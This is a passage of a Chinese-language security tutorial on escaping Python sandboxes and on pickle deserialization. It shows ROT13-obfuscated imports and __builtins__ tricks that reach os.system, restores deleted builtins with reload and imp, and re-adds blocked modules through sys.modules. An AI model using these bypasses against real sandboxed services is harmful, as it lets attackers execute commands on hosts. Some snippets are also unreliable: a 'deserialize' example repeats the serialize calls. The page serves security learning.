class="string">&quot;https://api.github.com/repos/python/cpython/contents/Lib?ref=&quot;</span>+version</span><br><span class="line">    results = get_file_name(url)</span><br><span class="line">    <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span>:</span><br><span class="line">        python2(results)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        python3(results)</span><br></pre></td></tr></table></figure><h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><h4 id="使用编码进行导入"><a href="#使用编码进行导入" class="headerlink" title="使用编码进行导入"></a>使用编码进行导入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">test = <span class="built_in">__import__</span>(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> test.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">test = <span class="built_in">__import__</span>(<span class="built_in">__import__</span>(<span class="string">&quot;codecs&quot;</span>).decode(<span class="string">&#x27;bf&#x27;</span>,<span class="string">&#x27;rot_13&#x27;</span>))  <span class="comment"># python3没有commands模块</span></span><br><span class="line"><span class="built_in">print</span>(test.system(<span class="string">&#x27;ifconfig&#x27;</span>))</span><br><span class="line">```使用importlib库</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">test = importlib.import_module(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> test.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">test = importlib.import_module(importlib.import_module(<span class="string">&quot;codecs&quot;</span>).decode(<span class="string">&#x27;bf&#x27;</span>,<span class="string">&#x27;rot_13&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(test.system(<span class="string">&#x27;ifconfig&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="内置函数被删除"><a href="#内置函数被删除" class="headerlink" title="内置函数被删除"></a>内置函数被删除</h4><p>在python中不用引入直接使用的内置函数称为builtin函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在python3.x 版本中__builtin__变成了builtins</p><p>__builtin__和builtins在都需要import才可以用，但是__builtins__是内置的直接可以用</p><p>用__builtin__来举例子，因此open()、int()、chr()这些函数，就相当于<br>复制成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtin__.<span class="built_in">open</span>()</span><br><span class="line">__builtin__.<span class="built_in">int</span>()</span><br><span class="line">__builtin__.<span class="built_in">chr</span>()</span><br></pre></td></tr></table></figure><p>如果我们把这些函数从__builtin__中删除，那么就不能够再直接使用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># python2</span></span><br><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__.<span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtin__.<span class="built_in">chr</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;chr&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__.<span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;module&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;chr&#x27;</span></span><br></pre></td></tr></table></figure><p>众所周知eval、exec、execfile也是在__builtin__中的，所以删除就不能用了，但是我们可以使用重加载函数reload()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtin__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;&#123;&#x27;</span></span><br></pre></td></tr></table></figure><p>reload也是__builtin__下面的函数，如果直接把它干掉，就没办法重新引入了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtin__.reload</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtin__)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;reload&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><p>直接使用imp模块，这样我们就重新得到完整的__builtin__模块了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>imp.reload(__builtin__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><h4 id="部分模块被限制"><a href="#部分模块被限制" class="headerlink" title="部分模块被限制"></a>部分模块被限制</h4><p>服务器如果对Python的某些高风险模块如os进行了删除或修改权限设置，可能导致无法正常使用。但是sys没有限制，我们可以使用sys.modules来查看初始化就加载的模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules</span><br><span class="line">&#123;<span class="string">&#x27;copy_reg&#x27;</span>: &lt;module <span class="string">&#x27;copy_reg&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/copy_reg.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;sre_compile&#x27;</span>: &lt;module <span class="string">&#x27;sre_compile&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_compile.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_sre&#x27;</span>: &lt;module <span class="string">&#x27;_sre&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings&#x27;</span>: &lt;module <span class="string">&#x27;encodings&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/encodings/__init__.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;site&#x27;</span>: &lt;module <span class="string">&#x27;site&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/site.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;__builtin__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;sysconfig&#x27;</span>: &lt;module <span class="string">&#x27;sysconfig&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sysconfig.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;__main__&#x27;</span>: &lt;module <span class="string">&#x27;__main__&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.encodings&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;abc&#x27;</span>: &lt;module <span class="string">&#x27;abc&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/abc.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;posixpath&#x27;</span>: &lt;module <span class="string">&#x27;posixpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/posixpath.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_weakrefset&#x27;</span>: &lt;module <span class="string">&#x27;_weakrefset&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/_weakrefset.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;errno&#x27;</span>: &lt;module <span class="string">&#x27;errno&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.codecs&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;sre_constants&#x27;</span>: &lt;module <span class="string">&#x27;sre_constants&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_constants.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;re&#x27;</span>: &lt;module <span class="string">&#x27;re&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/re.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_abcoll&#x27;</span>: &lt;module <span class="string">&#x27;_abcoll&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/_abcoll.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;types&#x27;</span>: &lt;module <span class="string">&#x27;types&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/types.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_codecs&#x27;</span>: &lt;module <span class="string">&#x27;_codecs&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.__builtin__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;_warnings&#x27;</span>: &lt;module <span class="string">&#x27;_warnings&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;genericpath&#x27;</span>: &lt;module <span class="string">&#x27;genericpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/genericpath.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;stat&#x27;</span>: &lt;module <span class="string">&#x27;stat&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/stat.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;zipimport&#x27;</span>: &lt;module <span class="string">&#x27;zipimport&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;_sysconfigdata&#x27;</span>: &lt;module <span class="string">&#x27;_sysconfigdata&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/_sysconfigdata.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;warnings&#x27;</span>: &lt;module <span class="string">&#x27;warnings&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/warnings.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;UserDict&#x27;</span>: &lt;module <span class="string">&#x27;UserDict&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/UserDict.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;glob&#x27;</span>: &lt;module <span class="string">&#x27;glob&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/glob.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.utf_8&#x27;</span>: &lt;module <span class="string">&#x27;encodings.utf_8&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/encodings/utf_8.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;sys&#x27;</span>: &lt;module <span class="string">&#x27;sys&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;fnmatch&#x27;</span>: &lt;module <span class="string">&#x27;fnmatch&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/fnmatch.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;imp&#x27;</span>: &lt;module <span class="string">&#x27;imp&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;codecs&#x27;</span>: &lt;module <span class="string">&#x27;codecs&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/codecs.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;readline&#x27;</span>: &lt;module <span class="string">&#x27;readline&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/lib-dynload/readline.x86_64-linux-gnu.so&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_sysconfigdata_nd&#x27;</span>: &lt;module <span class="string">&#x27;_sysconfigdata_nd&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu/_sysconfigdata_nd.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;os.path&#x27;</span>: &lt;module <span class="string">&#x27;posixpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/posixpath.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_locale&#x27;</span>: &lt;module <span class="string">&#x27;_locale&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;sitecustomize&#x27;</span>: &lt;module <span class="string">&#x27;sitecustomize&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sitecustomize.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;signal&#x27;</span>: &lt;module <span class="string">&#x27;signal&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;traceback&#x27;</span>: &lt;module <span class="string">&#x27;traceback&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/traceback.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;linecache&#x27;</span>: &lt;module <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/linecache.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;posix&#x27;</span>: &lt;module <span class="string">&#x27;posix&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;encodings.aliases&#x27;</span>: &lt;module <span class="string">&#x27;encodings.aliases&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/encodings/aliases.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;exceptions&#x27;</span>: &lt;module <span class="string">&#x27;exceptions&#x27;</span> (built-<span class="keyword">in</span>)&gt;,</span><br><span class="line"> <span class="string">&#x27;sre_parse&#x27;</span>: &lt;module <span class="string">&#x27;sre_parse&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/sre_parse.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;os&#x27;</span>: &lt;module <span class="string">&#x27;os&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_weakref&#x27;</span>: &lt;module <span class="string">&#x27;_weakref&#x27;</span> (built-<span class="keyword">in</span>)&gt;&#125;</span><br></pre></td></tr></table></figure><p>如果我们修改掉os模块的路径，那么就无法使用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>importlib.import_module(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;importlib/__init__.py&quot;</span>, line <span class="number">37</span>, <span class="keyword">in</span> import_module</span><br><span class="line">    <span class="built_in">__import__</span>(name)</span><br><span class="line">ImportError: No module named os</span><br></pre></td></tr></table></figure><p>但是我们可以手动的在加上去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><h4 id="文件或者模块全被删除"><a href="#文件或者模块全被删除" class="headerlink" title="文件或者模块全被删除"></a>文件或者模块全被删除</h4><p>最极端的方式就是os、sys、reload模块都被干掉了，usr等目录被限制了权限，那么我们就可以使用Python加载模块的先后顺序的方式</p><p>当前目录 -&gt; sys.path列表中的其他目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line">[<span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-tk&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-old&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-dynload&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>]</span><br></pre></td></tr></table></figure><p>只需要把文件上传到当前文件同级目录就可以直接import os使用</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>将对象转换为可通过网络传输或可以存储到本地磁盘的数据格式（如：XML、JSON或特定格式的字节串）的过程称为序列化；反之，则称为反序列化。如果用户反序列化一些不改反序列化的东西，那么就会造成漏洞</p><table><thead><tr><th align="left">模块名称</th><th align="left">描述</th><th align="left">提供的api</th></tr></thead><tbody><tr><td align="left">pickle</td><td align="left">用于实现Python数据类型与Python特定二进制格式之间的转换</td><td align="left">dumps()、dump()、loads()、load()</td></tr><tr><td align="left">json</td><td align="left">用于实现Python数据类型与通用（json）字符串之间的转换</td><td align="left">dumps()、dump()、loads()、load()</td></tr><tr><td align="left">shelve</td><td align="left">专门用于将Python数据类型的数据持久化到磁盘，shelve是一个类似dict的对象，操作十分便捷</td><td align="left">open()</td></tr><tr><td align="left">能够利用的函数pickle.loads</td><td align="left"></td><td align="left"></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pickle.load</span><br><span class="line">pickle.Unpickler  <span class="comment"># 像一个代理类一样，在序列化前进行处理，进行安全过滤之类的</span></span><br><span class="line">cPickle.loads</span><br><span class="line">cPickle.load</span><br><span class="line">cPickle.Unpickler  <span class="comment"># 像一个代理类一样，在序列化前进行处理，进行安全过滤之类的</span></span><br><span class="line">shelve.<span class="built_in">open</span></span><br><span class="line">marshal.load</span><br><span class="line">marshal.loads</span><br></pre></td></tr></table></figure><h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><p>1.序列化数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 字节流</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>2.反序列化数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 字节流</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>, *, fix_imports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><pre><code>pickle.Unpickler像一个代理类一样，在序列化前进行处理，进行安全过滤之类的。</code></pre><p>Python2标准库中有pickle和cPickle，Python3中只有前者。</p><p>pickle由于有不同的实现版本，目前有6个版本，但是pickle可以向下兼容（所以用v0就可以在所有版本中执行），目前pickle只有6个版本。</p><p>如果python2中的序列化文件如果想在python3中读取，需要修改编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 选定pickle版本</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"><span class="comment"># python2读取文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    l = <span class="built_in">list</span>(pickle.load(f))</span><br><span class="line"><span class="comment"># python3读取文件</span></span><br><span class="line"><span 